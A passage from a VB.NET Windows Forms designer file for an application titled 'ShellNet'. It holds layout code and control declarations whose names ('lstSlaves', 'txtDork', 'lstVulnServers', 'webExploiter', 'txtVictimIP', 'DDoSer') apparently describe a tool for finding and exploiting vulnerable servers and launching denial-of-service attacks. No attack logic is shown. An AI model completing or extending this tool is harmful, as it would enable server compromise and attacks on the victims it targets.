        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.ClientSize = New System.Drawing.Size(547, 290)
        Me.Controls.Add(Me.BonfireTabControl1)
        Me.Controls.Add(Me.BonfireLabelHeader2)
        Me.Controls.Add(Me.lstSlaves)
        Me.Controls.Add(Me.ClsControlMenu1)
        Me.Controls.Add(Me.BonfireLabelHeader1)
        Me.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None
        Me.Name = "Form1"
        Me.ShowIcon = False
        Me.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen
        Me.Text = "ShellNet"
        Me.BonfireTabControl1.ResumeLayout(False)
        Me.TabPage1.ResumeLayout(False)
        Me.TabPage1.PerformLayout()
        Me.GroupBox1.ResumeLayout(False)
        Me.GroupBox1.PerformLayout()
        Me.TabPage2.ResumeLayout(False)
        Me.TabPage2.PerformLayout()
        Me.GroupBox2.ResumeLayout(False)
        Me.Panel1.ResumeLayout(False)
        Me.Panel1.PerformLayout()
        Me.TabPage3.ResumeLayout(False)
        Me.GroupBox3.ResumeLayout(False)
        Me.GroupBox3.PerformLayout()
        CType(Me.trckPower, System.ComponentModel.ISupportInitialize).EndInit()
        Me.TabPage4.ResumeLayout(False)
        Me.BonfireTabControl2.ResumeLayout(False)
        Me.TabPage7.ResumeLayout(False)
        Me.ResumeLayout(False)
        Me.PerformLayout()

    End Sub

    Friend WithEvents BonfireTabControl1 As BonfireTabControl
    Friend WithEvents TabPage1 As TabPage
    Friend WithEvents TabPage2 As TabPage
    Friend WithEvents BonfireLabelHeader1 As BonfireLabelHeader
    Friend WithEvents TabPage3 As TabPage
    Friend WithEvents BonfireLabelHeader2 As BonfireLabelHeader
    Friend WithEvents ClsControlMenu1 As clsControlMenu
    Friend WithEvents lstSlaves As ListBox
    Friend WithEvents GroupBox1 As GroupBox
    Friend WithEvents BonfireButton1 As BonfireButton
    Friend WithEvents LinkLabel1 As LinkLabel
    Friend WithEvents txtDork As TextBox
    Friend WithEvents BonfireLabel1 As BonfireLabel
    Friend WithEvents TabPage4 As TabPage
    Friend WithEvents TabPage5 As TabPage
    Friend WithEvents lstServersFound As ListBox
    Friend WithEvents txtServerFound As BonfireLabelHeader
    Friend WithEvents GroupBox2 As GroupBox
    Friend WithEvents Panel1 As Panel
    Friend WithEvents BonfireButton2 As BonfireButton
    Friend WithEvents txtImport As BonfireLabelHeader
    Friend WithEvents lstVulnServers As ListBox
    Friend WithEvents linkGetter As WebBrowser
    Friend WithEvents BonfireButton3 As BonfireButton
    Friend WithEvents lstreadytoscan As ListBox
    Friend WithEvents alertSCAN As BonfireAlertBox
    Friend WithEvents GroupBox3 As GroupBox
    Friend WithEvents BonfireButton4 As BonfireButton
    Friend WithEvents Powerfdsfgdg As BonfireLabelHeader
    Friend WithEvents trckPower As TrackBar
    Friend WithEvents txtVictimIP As TextBox
    Friend WithEvents BonfireLabel2 As BonfireLabel
    Friend WithEvents txtPowerValue As BonfireLabel
    Friend WithEvents ClsButtonBlue4 As clsButtonBlue
    Friend WithEvents ClsButtonBlue3 As clsButtonBlue
    Friend WithEvents ClsButtonBlue2 As clsButtonBlue
    Friend WithEvents ClsButtonBlue1 As clsButtonBlue
    Friend WithEvents BonfireTabControl2 As BonfireTabControl
    Friend WithEvents TabPage6 As TabPage
    Friend WithEvents TabPage7 As TabPage
    Friend WithEvents lstConsole As ListBox
    Friend WithEvents webExploiter As WebBrowser
    Friend WithEvents timeoutchecker As Timer
    Friend WithEvents txtVULNSERV As BonfireLabel
    Friend WithEvents BonfireLabel3 As BonfireLabel
    Friend WithEvents txtLEFT2SCAN As BonfireLabel
    Friend WithEvents BonfireLabel4 As BonfireLabel
    Friend WithEvents quote As Label
    Friend WithEvents ListBox1 As ListBox
    Friend WithEvents DDoSer As Timer
End Class
